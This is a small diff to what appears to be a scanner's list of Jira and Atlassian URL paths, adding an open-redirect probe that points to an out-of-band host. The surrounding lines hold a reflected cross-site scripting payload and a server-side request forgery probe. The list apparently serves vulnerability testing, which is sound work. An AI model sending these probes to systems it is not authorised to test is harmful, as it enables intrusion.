@@ -23,3 +23,4 @@
 //secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search
 /plugins/servlet/gadgets/makeRequest?url=https://{{Hostname}}:1337@example.com
 /servicedesk/customer/user/signup
+/ThisCanBeAnything?os_destination=%2F%2Foast.pro
